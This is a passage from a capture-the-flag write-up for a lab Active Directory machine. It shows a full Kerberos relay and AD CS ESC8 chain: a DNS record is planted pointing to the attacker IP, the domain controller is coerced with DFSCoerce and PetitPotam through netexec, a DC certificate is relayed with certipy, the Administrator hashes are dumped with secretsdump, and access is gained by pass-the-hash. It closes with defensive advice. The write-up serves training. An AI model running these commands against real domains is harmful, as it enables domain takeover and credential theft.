apparently this kind of hash reflection is only supposed to be possible from one machine to another, except for with Kerberos. In fact, a group named CICADA8-Research automates this exploit with this: <a href=https://github.com/CICADA8-Research/RemoteKrbRelay>https://github.com/CICADA8-Research/RemoteKrbRelay</a>. Looking at the box name, this seems like we&rsquo;re probably on the right track.</p><p>However, going from Windows is a pain, so luckily there appears to also be this: <a href=https://github.com/dirkjanm/krbrelayx>krbrelayx</a> meant for doing the attack from another angle and from linux only. Looking at what this is doing, we can accomplish roughly the same thing with bloodyAD, certipy, and netexec.</p><p>We&rsquo;ll use <a href=https://github.com/CravateRouge/bloodyAD>bloodyAD</a> to add a new computer to the domain with our IP address (<code>10.10.14.245</code> here is my attacker IP):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python bloodyAD.py -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ225PIZZAMCCHICKEN 10.10.14.245
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> DC-JPQ225PIZZAMCCHICKEN has been successfully added
+</span></span></code></pre></div><p>Then we&rsquo;ll start our relay server that we&rsquo;ll work on getting ADCS to authenticate to:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>certipy relay -target <span style=color:#e6db74>&#39;http://dc-jpq225.cicada.vl/&#39;</span> -template DomainController
+</span></span><span style=display:flex><span>Certipy v5.0.3 - by Oliver Lyak <span style=color:#f92672>(</span>ly4k<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  import pkg_resources
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp <span style=color:#f92672>(</span>ESC8<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Listening on 0.0.0.0:445
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Setting up SMB Server on port <span style=color:#ae81ff>445</span>
+</span></span></code></pre></div><p>Then we&rsquo;ll use netexec to attempt to coerce it into authenticating with our server. First we should see what methods netexec thinks will work:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus 
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> First time use detected
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Creating home directory structure
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Creating missing folder logs
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Creating missing folder modules
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Creating missing folder protocols
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Creating missing folder workspaces
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Creating missing folder obfuscated_scripts
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Creating missing folder screenshots
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Creating missing folder logs/sam
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Creating missing folder logs/lsa
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Creating missing folder logs/ntds
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Creating missing folder logs/dpapi
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Creating default workspace
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Initializing RDP protocol database
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Initializing FTP protocol database
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Initializing WINRM protocol database
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Initializing MSSQL protocol database
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Initializing NFS protocol database
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Initializing VNC protocol database
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Initializing WMI protocol database
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Initializing SSH protocol database
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Initializing SMB protocol database
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Initializing LDAP protocol database
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Copying default configuration file
+</span></span><span style=display:flex><span>SMB         DC-JPQ225.cicada.vl <span style=color:#ae81ff>445</span>    DC-JPQ225        <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span>  x64 <span style=color:#f92672>(</span>name:DC-JPQ225<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>domain:cicada.vl<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>signing:True<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>SMBv1:False<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>NTLM:False<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>SMB         DC-JPQ225.cicada.vl <span style=color:#ae81ff>445</span>    DC-JPQ225        <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> cicada.vl<span style=color:#ae81ff>\R</span>osie.Powell:Cicada123 
+</span></span><span style=display:flex><span>COERCE_PLUS DC-JPQ225.cicada.vl <span style=color:#ae81ff>445</span>    DC-JPQ225        VULNERABLE, DFSCoerce
+</span></span><span style=display:flex><span>COERCE_PLUS DC-JPQ225.cicada.vl <span style=color:#ae81ff>445</span>    DC-JPQ225        VULNERABLE, PetitPotam
+</span></span><span style=display:flex><span>COERCE_PLUS DC-JPQ225.cicada.vl <span style=color:#ae81ff>445</span>    DC-JPQ225        VULNERABLE, PrinterBug
+</span></span><span style=display:flex><span>COERCE_PLUS DC-JPQ225.cicada.vl <span style=color:#ae81ff>445</span>    DC-JPQ225        VULNERABLE, PrinterBug
+</span></span><span style=display:flex><span>COERCE_PLUS DC-JPQ225.cicada.vl <span style=color:#ae81ff>445</span>    DC-JPQ225        VULNERABLE, MSEven
+</span></span></code></pre></div><p>Let&rsquo;s start with the first one and see how it goes.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER<span style=color:#f92672>=</span>DC-JPQ225PIZZAMCCHICKEN METHOD<span style=color:#f92672>=</span>DFSCoerce
+</span></span></code></pre></div><p>The exploit appears to succeed:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER<span style=color:#f92672>=</span>DC-JPQ225PIZZAMCCHICKEN METHOD<span style=color:#f92672>=</span>DFSCoerce
+</span></span><span style=display:flex><span>SMB         DC-JPQ225.cicada.vl <span style=color:#ae81ff>445</span>    DC-JPQ225        <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span>  x64 <span style=color:#f92672>(</span>name:DC-JPQ225<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>domain:cicada.vl<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>signing:True<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>SMBv1:False<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>NTLM:False<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>SMB         DC-JPQ225.cicada.vl <span style=color:#ae81ff>445</span>    DC-JPQ225        <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> cicada.vl<span style=color:#ae81ff>\R</span>osie.Powell:Cicada123 
+</span></span><span style=display:flex><span>COERCE_PLUS DC-JPQ225.cicada.vl <span style=color:#ae81ff>445</span>    DC-JPQ225        VULNERABLE, DFSCoerce
+</span></span><span style=display:flex><span>COERCE_PLUS DC-JPQ225.cicada.vl <span style=color:#ae81ff>445</span>    DC-JPQ225        Exploit Success, netdfs<span style=color:#ae81ff>\N</span>etrDfsRemoveRootTarget
+</span></span><span style=display:flex><span>COERCE_PLUS DC-JPQ225.cicada.vl <span style=color:#ae81ff>445</span>    DC-JPQ225        Exploit Success, netdfs<span style=color:#ae81ff>\N</span>etrDfsAddStdRoot
+</span></span><span style=display:flex><span>COERCE_PLUS DC-JPQ225.cicada.vl <span style=color:#ae81ff>445</span>    DC-JPQ225        Exploit Success, netdfs<span style=color:#ae81ff>\N</span>etrDfsRemoveStdRoot
+</span></span></code></pre></div><p>And we can see the connections to our certipy relay which appear to be finishing the exploit:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> SMBD-Thread-2 <span style=color:#f92672>(</span>process_request_thread<span style=color:#f92672>)</span>: Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> SMBD-Thread-3 <span style=color:#f92672>(</span>process_request_thread<span style=color:#f92672>)</span>: Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> SMBD-Thread-4 <span style=color:#f92672>(</span>process_request_thread<span style=color:#f92672>)</span>: Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> SMBD-Thread-5 <span style=color:#f92672>(</span>process_request_thread<span style=color:#f92672>)</span>: Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> SMBD-Thread-6 <span style=color:#f92672>(</span>process_request_thread<span style=color:#f92672>)</span>: Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> SMBD-Thread-7 <span style=color:#f92672>(</span>process_request_thread<span style=color:#f92672>)</span>: Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> SMBD-Thread-8 <span style=color:#f92672>(</span>process_request_thread<span style=color:#f92672>)</span>: Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> SMBD-Thread-9 <span style=color:#f92672>(</span>process_request_thread<span style=color:#f92672>)</span>: Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
+</span></span></code></pre></div><p>This takes a while, so it&rsquo;s time to wait and see if we succeed. If we do, we should eventually get a .pfx file from certipy.</p><p>After waiting 5-10 minutes, there was no .pfx file, so I decided to move onto the next coercion method:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER<span style=color:#f92672>=</span>DC-JPQ225PIZZAMCCHICKEN METHOD<span style=color:#f92672>=</span>PetitPotam
+</span></span><span style=display:flex><span>SMB         DC-JPQ225.cicada.vl <span style=color:#ae81ff>445</span>    DC-JPQ225        <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span>  x64 <span style=color:#f92672>(</span>name:DC-JPQ225<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>domain:cicada.vl<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>signing:True<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>SMBv1:False<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>NTLM:False<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>SMB         DC-JPQ225.cicada.vl <span style=color:#ae81ff>445</span>    DC-JPQ225        <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> cicada.vl<span style=color:#ae81ff>\R</span>osie.Powell:Cicada123 
+</span></span><span style=display:flex><span>COERCE_PLUS DC-JPQ225.cicada.vl <span style=color:#ae81ff>445</span>    DC-JPQ225        VULNERABLE, PetitPotam
+</span></span><span style=display:flex><span>COERCE_PLUS DC-JPQ225.cicada.vl <span style=color:#ae81ff>445</span>    DC-JPQ225        Exploit Success, lsarpc<span style=color:#ae81ff>\E</span>fsRpcAddUsersToFile
+</span></span></code></pre></div><p>We get more connections on our certipy relay (I restarted it just in case):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>certipy relay -target <span style=color:#e6db74>&#39;http://dc-jpq225.cicada.vl/&#39;</span> -template DomainController
+</span></span><span style=display:flex><span>Certipy v5.0.3 - by Oliver Lyak <span style=color:#f92672>(</span>ly4k<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  import pkg_resources
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp <span style=color:#f92672>(</span>ESC8<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Listening on 0.0.0.0:445
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Setting up SMB Server on port <span style=color:#ae81ff>445</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> SMBD-Thread-2 <span style=color:#f92672>(</span>process_request_thread<span style=color:#f92672>)</span>: Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> SMBD-Thread-3 <span style=color:#f92672>(</span>process_request_thread<span style=color:#f92672>)</span>: Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
+</span></span></code></pre></div><p>My experience was that this vulnerability was VERY flaky to exploit and takes a long time, much longer than it seems like it should.</p><p>Eventually, after a number of tries using different coerce methods, I got this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Unsupported MechType <span style=color:#e6db74>&#39;MS KRB5 - Microsoft Kerberos 5&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp <span style=color:#e6db74>&#34;HTTP/1.1 401 Unauthorized&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp <span style=color:#e6db74>&#34;HTTP/1.1 401 Unauthorized&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp <span style=color:#e6db74>&#34;HTTP/1.1 200 OK&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Authenticating against http://dc-jpq225.cicada.vl as / SUCCEED
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Requesting certificate <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#39;\\&#39;</span> based on the template <span style=color:#e6db74>&#39;DomainController&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> HTTP Request: POST http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp <span style=color:#e6db74>&#34;HTTP/1.1 200 OK&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Certificate issued with request ID <span style=color:#ae81ff>95</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Retrieving certificate <span style=color:#66d9ef>for</span> request ID: <span style=color:#ae81ff>95</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certnew.cer?ReqID<span style=color:#f92672>=</span><span style=color:#ae81ff>95</span> <span style=color:#e6db74>&#34;HTTP/1.1 200 OK&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Got certificate with DNS Host Name <span style=color:#e6db74>&#39;DC-JPQ225.cicada.vl&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Certificate object SID is <span style=color:#e6db74>&#39;S-1-5-21-687703393-1447795882-66098247-1000&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Saving certificate and private key to <span style=color:#e6db74>&#39;dc-jpq225.pfx&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Wrote certificate and private key to <span style=color:#e6db74>&#39;dc-jpq225.pfx&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Exiting...
+</span></span></code></pre></div><p>Now that we have the certificate we can hopefully extract hashes for the computer user with certipy:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.234.48
+</span></span><span style=display:flex><span>Certipy v5.0.3 - by Oliver Lyak <span style=color:#f92672>(</span>ly4k<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Certificate identities:
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span>     SAN DNS Host Name: <span style=color:#e6db74>&#39;DC-JPQ225.cicada.vl&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span>     Security Extension SID: <span style=color:#e6db74>&#39;S-1-5-21-687703393-1447795882-66098247-1000&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Using principal: <span style=color:#e6db74>&#39;dc-jpq225$@cicada.vl&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Trying to get TGT...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Got TGT
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Saving credential cache to <span style=color:#e6db74>&#39;dc-jpq225.ccache&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Wrote credential cache to <span style=color:#e6db74>&#39;dc-jpq225.ccache&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Trying to retrieve NT hash <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#39;dc-jpq225$&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Got hash <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#39;dc-jpq225$@cicada.vl&#39;</span>: aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
+</span></span></code></pre></div><p>As a bonus we also get a Kerberos TGT. Let&rsquo;s set up our environment to use that instead of Rosie&rsquo;s:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>KRB5CCNAME<span style=color:#f92672>=</span>dc-jpq225.ccache
+</span></span></code></pre></div><p>Then, we can dump hashes from the machine with impacket:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>impacket-secretsdump -k -no-pass cicada.vl/dc-jpq225<span style=color:#ae81ff>\$</span>@dc-jpq225.cicada.vl -just-dc-user administrator
+</span></span><span style=display:flex><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Dumping Domain Credentials <span style=color:#f92672>(</span>domain<span style=color:#ae81ff>\u</span>id:rid:lmhash:nthash<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span style=display:flex><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Kerberos keys grabbed
+</span></span><span style=display:flex><span>Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
+</span></span><span style=display:flex><span>Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
+</span></span><span style=display:flex><span>Administrator:des-cbc-md5:fd2a29621f3e7604
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Cleaning up... 
+</span></span></code></pre></div><p>Then, we can use this hash to get SMB access as Administrator to access all files on the machine:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>impacket-smbclient -k -hashes <span style=color:#e6db74>&#39;aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87&#39;</span> cicada.vl/Administrator@DC-JPQ225.cicada.vl   
+</span></span><span style=display:flex><span>/home/kali/.virtualenvs/htb/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span style=color:#66d9ef>for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+</span></span><span style=display:flex><span>  import pkg_resources
+</span></span><span style=display:flex><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> CCache file is not found. Skipping...
+</span></span><span style=display:flex><span>Type help <span style=color:#66d9ef>for</span> list of commands
+</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
+</span></span></code></pre></div><p>We can then find both user.txt and root.txt on the Administrator&rsquo;s desktop:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># ls</span>
+</span></span><span style=display:flex><span>drw-rw-rw-          <span style=color:#ae81ff>0</span>  Fri Apr <span style=color:#ae81ff>11</span> 02:00:38 <span style=color:#ae81ff>2025</span> .
+</span></span><span style=display:flex><span>drw-rw-rw-          <span style=color:#ae81ff>0</span>  Fri Sep <span style=color:#ae81ff>13</span> 12:10:12 <span style=color:#ae81ff>2024</span> ..
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>282</span>  Fri Sep <span style=color:#ae81ff>13</span> 06:21:49 <span style=color:#ae81ff>2024</span> desktop.ini
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>2304</span>  Sun Sep <span style=color:#ae81ff>15</span> 09:26:47 <span style=color:#ae81ff>2024</span> Microsoft Edge.lnk
+</span></span><span style=display:flex><span>-rw-rw-rw-         <span style=color:#ae81ff>34</span>  Sat Jul  <span style=color:#ae81ff>5</span> 17:32:50 <span style=color:#ae81ff>2025</span> root.txt
+</span></span><span style=display:flex><span>-rw-rw-rw-         <span style=color:#ae81ff>34</span>  Sat Jul  <span style=color:#ae81ff>5</span> 17:32:50 <span style=color:#ae81ff>2025</span> user.txt
+</span></span></code></pre></div><h3 id=closing-the-vulnerability>Closing the Vulnerability</h3><ul><li>Don&rsquo;t store passwords on sticky notes - even with the ESC8 vulnerability we wouldn&rsquo;t have been able to exploit it without Rosie.Powell&rsquo;s credentials.</li><li>Make sure images you post don&rsquo;t have sensitive info - even though Rosie put her password on a sticky note, we still would&rsquo;ve needed physical access to her desk to exploit this, except that she or someone else posted shared a picture that had her password accidentally disclosed.</li><li>Be careful what you put on NFS, since connecting gives users potentially access to everything in the share regardless of what the system level permissions are</li><li>Watch out for ESC series vulnerability in active directory. The following must be present for an ESC8 vulnerability to exist:<ul><li>AD CS Web Enrollment enabled</li><li>NTLM Auth is accepted over HTTP</li><li>Certificate templates with auto-issue set</li><li>Weak validation of certificate requests (i.e. a single person can do it)</li><li>Attacker able to coerce NTLM auth from a privileged account</li></ul></li></ul><h3 id=key-penetration-testing-takeaways>Key Penetration Testing Takeaways</h3><ul><li>All ports matter; think about how services in various places might be chained together to get you what you need.</li><li>Sometimes it is handy to have an environment besides just Linux around, even if it&rsquo;s just a Windows VM.</li><li>Sometimes you have to be willing to go the extra mile to get a complicated exploit to work.</li><li>Exploits can be flaky.</li><li>Investigate posted pictures from known employees to see if things may have been exposed inadvertently.</li></ul></div></article></div><script src=/lightbox.js></script></body></html>
